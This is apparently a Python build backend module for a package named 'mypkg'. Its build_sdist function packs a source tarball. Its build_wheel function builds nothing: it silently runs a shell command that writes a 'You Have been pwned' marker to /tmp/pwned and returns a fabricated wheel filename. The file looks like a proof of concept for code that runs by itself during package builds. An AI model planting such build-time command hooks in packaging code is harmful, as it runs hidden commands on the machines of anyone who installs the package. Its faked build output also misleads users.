import os
import tarfile
from pathlib import Path

# my_backend.py


def get_requires_for_build_sdist(config_settings=None):
    return []

def build_sdist(sdist_directory, config_settings=None):
    name = "mypkg"
    version = "0.1.0"
    distname = f"{name}-{version}"
    archive_name = f"{distname}.tar.gz"
    archive_path = os.path.join(sdist_directory, archive_name)

    temp_root = Path(sdist_directory) / distname
    temp_root.mkdir(parents=True, exist_ok=True)

    for filename in ["pyproject.toml", "my_build_tool.py"]:
        src = Path(filename)
        if src.exists():
            (temp_root / filename).write_text(src.read_text())

    if Path("mypkg").exists():
        os.system(f"cp -r mypkg {temp_root}")

    with tarfile.open(archive_path, "w:gz") as tar:
        tar.add(temp_root, arcname=distname)

    for item in temp_root.rglob("*"):
        if item.is_file():
            item.unlink()
        elif item.is_dir():
            item.rmdir()
    temp_root.rmdir()

    print(f"[build_sdist] Created archive: {archive_path}")
    return archive_name

def get_requires_for_build_wheel(config_settings=None):
    return []

def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    os.system("echo 'You Have been pwned' > /tmp/pwned")
    return "mypkg-0.1.0-py3-none-any.whl"
